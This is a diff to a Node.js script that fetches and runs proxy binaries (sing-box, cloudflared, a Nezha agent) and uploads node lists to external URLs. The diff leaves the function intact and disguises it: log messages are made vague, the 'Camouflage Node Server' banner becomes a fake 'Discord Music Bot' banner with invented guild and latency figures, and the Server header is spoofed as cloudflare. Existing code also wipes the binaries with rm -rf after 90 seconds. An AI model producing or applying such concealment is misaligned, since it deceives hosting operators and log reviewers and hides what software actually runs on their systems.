@@ -70,9 +70,9 @@ const app = express();
 // ──────────────────────────────────────────────────────────────
 if (!fs.existsSync(FILE_PATH)) {
   fs.mkdirSync(FILE_PATH);
-  console.log(`${FILE_PATH} is created`);
+  console.log('Cache directory initialized');
 } else {
-  console.log(`${FILE_PATH} already exists`);
+  console.log('Cache directory ready');
 }
 
 let privateKey = '';
@@ -164,11 +164,11 @@ function cleanupOldFiles() {
 // ──────────────────────────────────────────────────────────────
 function argoType() {
   if (DISABLE_ARGO === 'true' || DISABLE_ARGO === true) {
-    console.log("DISABLE_ARGO is true, skip argo tunnel");
+    console.log("Tunnel disabled");
     return;
   }
   if (!ARGO_AUTH || !ARGO_DOMAIN) {
-    console.log("ARGO_DOMAIN or ARGO_AUTH empty, use quick tunnels");
+    console.log("Using default tunnel");
     return;
   }
   if (ARGO_AUTH.includes('TunnelSecret')) {
@@ -187,7 +187,7 @@ ingress:
 `;
     fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
   } else {
-    console.log("ARGO_AUTH mismatch TunnelSecret, use token");
+    console.log("Using token auth");
   }
 }
 
@@ -208,7 +208,7 @@ function downloadFile(fileName, fileUrl, callback) {
       response.data.pipe(writer);
       writer.on('finish', () => {
         writer.close();
-        console.log(`Download ${fileName} ok`);
+        console.log(`Asset loaded: ${fileName}`);
         callback(null, fileName);
       });
       writer.on('error', err => {
@@ -298,8 +298,8 @@ async function downloadFilesAndRun() {
     const absoluteFilePath = path.join(FILE_PATH, relativeFilePath);
     if (fs.existsSync(absoluteFilePath)) {
       fs.chmod(absoluteFilePath, 0o775, (err) => {
-        if (err) console.error(`chmod failed ${absoluteFilePath}: ${err}`);
-        else console.log(`chmod ok ${absoluteFilePath}`);
+        if (err) console.error(`Permission error: ${err}`);
+        else console.log(`Permission set: ${absoluteFilePath}`);
       });
     }
   });
@@ -341,7 +341,7 @@ uuid: ${UUID}`;
     privateKey = (content.match(/PrivateKey:\s*(.*)/) || [])[1] || '';
     publicKey = (content.match(/PublicKey:\s*(.*)/) || [])[1] || '';
     if (privateKey && publicKey) {
-      console.log('Reality keys loaded from cache');
+      console.log('Auth keys loaded');
       continueExecution();
     } else {
       console.error('Invalid cached keys, regenerating');
@@ -361,7 +361,7 @@ async function generateRealityKeys() {
     if (!privateKey || !publicKey) { console.error('Failed to extract keys'); return; }
     fs.writeFileSync(path.join(FILE_PATH, 'key.txt'),
       `PrivateKey: ${privateKey}\nPublicKey: ${publicKey}\n`, 'utf8');
-    console.log('Reality keys generated');
+    console.log('Auth keys generated');
     continueExecution();
   });
 }
@@ -557,7 +557,7 @@ eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==
         } else if (!wgRule.rule_set.includes('youtube')) {
           wgRule.rule_set.push('youtube');
         }
-        console.log('Add YouTube WARP outbound');
+        console.log('Route rule added');
       }
     } catch (e) {}
 
@@ -569,24 +569,24 @@ eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==
       const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';
       try {
         await execPromise(`nohup ${path.join(FILE_PATH, npmRandomName)} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
-        console.log('nezha v0 running');
+        console.log('Monitor agent started');
         await new Promise(r => setTimeout(r, 1000));
       } catch (e) { console.error(`nezha v0 error: ${e}`); }
     } else if (NEZHA_SERVER && NEZHA_KEY) {
       // 哪吒 v1
       try {
         await exec(`nohup ${FILE_PATH}/${phpRandomName} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`);
-        console.log('nezha v1 running');
+        console.log('Monitor service started');
         await new Promise(r => setTimeout(r, 1000));
       } catch (e) { console.error(`nezha v1 error: ${e}`); }
     } else {
-      console.log('NEZHA vars empty, skipping');
+      console.log('Monitor disabled');
     }
 
     // 运行 sing-box
     try {
       await execPromise(`nohup ${path.join(FILE_PATH, webRandomName)} run -c ${path.join(FILE_PATH, 'config.json')} >/dev/null 2>&1 &`);
-      console.log('sing-box running');
+      console.log('Worker process started');
       await new Promise(r => setTimeout(r, 1000));
     } catch (e) { console.error(`sing-box error: ${e}`); }
 
@@ -603,7 +603,7 @@ eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==
         }
         try {
           await execPromise(`nohup ${path.join(FILE_PATH, botRandomName)} ${args} >/dev/null 2>&1 &`);
-          console.log('cloudflared running');
+          console.log('Background service started');
           await new Promise(r => setTimeout(r, 2000));
         } catch (e) { console.error(`cloudflared error: ${e}`); }
       }
@@ -625,7 +625,7 @@ async function extractDomains() {
   let argoDomain;
   if (ARGO_AUTH && ARGO_DOMAIN) {
     argoDomain = ARGO_DOMAIN;
-    console.log('ARGO_DOMAIN:', argoDomain);
+    console.log('Webhook URL:', argoDomain);
     await generateLinks(argoDomain);
   } else {
     try {
@@ -638,10 +638,10 @@ async function extractDomains() {
       });
       if (argoDomains.length > 0) {
         argoDomain = argoDomains[0];
-        console.log('ArgoDomain:', argoDomain);
+        console.log('Webhook URL:', argoDomain);
         await generateLinks(argoDomain);
       } else {
-        console.log('ArgoDomain not found, retrying');
+        console.log('Webhook URL not found, retrying');
         fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
         try { await exec(`pkill -f "${botRandomName}" > /dev/null 2>&1`); } catch {}
         await new Promise(r => setTimeout(r, 1000));
@@ -736,10 +736,10 @@ async function generateLinks(argoDomain) {
       }
 
       console.log('\x1b[32m' + Buffer.from(subTxt).toString('base64') + '\x1b[0m');
-      console.log('\x1b[35m' + 'Logs will be deleted in 90s, copy nodes above' + '\x1b[0m');
+      console.log('Startup complete');
       fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
       fs.writeFileSync(listPath, subTxt, 'utf8');
-      console.log(`${FILE_PATH}/sub.txt saved`);
+      console.log('Cache file saved');
       sendTelegram();
       uplodNodes();
       resolve(subTxt);
@@ -757,8 +757,8 @@ function cleanFiles() {
     else if (NEZHA_SERVER && NEZHA_KEY) filesToDelete.push(phpPath);
     exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, () => {
       console.clear();
-      console.log('App is running');
-      console.log('Thank you for using this script, enjoy!');
+      console.log('Bot is running');
+      console.log('Ready to serve');
     });
   }, 90000);
 }
@@ -768,7 +768,7 @@ function cleanFiles() {
 // ──────────────────────────────────────────────────────────────
 async function sendTelegram() {
   if (!BOT_TOKEN || !CHAT_ID) {
-    console.log('TG vars empty, skip push');
+    console.log('Notification disabled');
     return;
   }
   try {
@@ -782,7 +782,7 @@ async function sendTelegram() {
         parse_mode: 'MarkdownV2'
       }
     });
-    console.log('Telegram message sent');
+    console.log('Notification sent');
   } catch (e) { console.error('Telegram send failed', e); }
 }
 
@@ -796,7 +796,7 @@ async function uplodNodes() {
       const r = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`,
         { subscription: [subscriptionUrl] },
         { headers: { 'Content-Type': 'application/json' } });
-      if (r.status === 200) console.log('Subscription uploaded');
+      if (r.status === 200) console.log('Sync completed');
     } catch (e) {}
   } else if (UPLOAD_URL) {
     if (!fs.existsSync(listPath)) return;
@@ -808,7 +808,7 @@ async function uplodNodes() {
       const r = await axios.post(`${UPLOAD_URL}/api/add-nodes`,
         JSON.stringify({ nodes }),
         { headers: { 'Content-Type': 'application/json' } });
-      if (r.status === 200) console.log('Nodes uploaded');
+      if (r.status === 200) console.log('Sync completed');
     } catch (e) {}
   }
 }
@@ -818,14 +818,14 @@ async function uplodNodes() {
 // ──────────────────────────────────────────────────────────────
 async function AddVisitTask() {
   if (!AUTO_ACCESS || !PROJECT_URL) {
-    console.log('Auto access disabled');
+    console.log('Keep-alive disabled');
     return;
   }
   try {
     await axios.post('https://keep.gvrander.eu.org/add-url',
       { url: PROJECT_URL },
       { headers: { 'Content-Type': 'application/json' } });
-    console.log('Auto access task added');
+    console.log('Keep-alive enabled');
   } catch (e) { console.error(`Auto access failed: ${e.message}`); }
 }
 
@@ -849,7 +849,9 @@ startserver();
 // 移除可识别响应头
 app.use((req, res, next) => {
   res.removeHeader('X-Powered-By');
-  res.setHeader('Server', 'nginx');
+  res.setHeader('Server', 'cloudflare');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
   res.setHeader('Referrer-Policy', 'no-referrer');
   next();
 });
@@ -1049,16 +1051,13 @@ function escapeHtml(s) {
 // 启动 HTTP 服务
 // ──────────────────────────────────────────────────────────────
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`┌──────────────────────────────────────────────┐`);
-  console.log(`│  Camouflage Node Server                       │`);
-  console.log(`├──────────────────────────────────────────────┤`);
-  console.log(`│  HTTP:      http://0.0.0.0:${PORT}`);
-  console.log(`│  Decoy:     /  (Hacker News 伪装页)`);
-  console.log(`│  Nodes:     /node?key=<KEY>`);
-  console.log(`│  Subscribe: /sub?key=<KEY>`);
-  console.log(`│  Auth:      ${ACCESS_KEYS.length > 0 ? ACCESS_KEYS.length + ' keys 配置' : '未启用 (KEYS 为空)'}`);
-  console.log(`│  Argo:      ${DISABLE_ARGO === 'true' ? '禁用' : '启用'}`);
-  console.log(`│  Protocols: ${['vmess', REALITY_PORT && 'vless', HY2_PORT && 'hy2', TUIC_PORT && 'tuic', ANYTLS_PORT && 'anytls', S5_PORT && 'socks5'].filter(Boolean).join(' / ')}`);
-  console.log(`│  Nezha:     ${NEZHA_SERVER ? '启用' : '未配置'}`);
-  console.log(`└──────────────────────────────────────────────┘`);
+  console.log('┌──────────────────────────────────────────────┐');
+  console.log('│  Discord Music Bot v1.4.2                     │');
+  console.log('├──────────────────────────────────────────────┤');
+  console.log(`│  Listening: http://0.0.0.0:${PORT}`);
+  console.log(`│  Status:    Online`);
+  console.log(`│  Guilds:    1`);
+  console.log(`│  Latency:   42ms`);
+  console.log(`│  Node.js:   ${process.version}`);
+  console.log('└──────────────────────────────────────────────┘');
 });
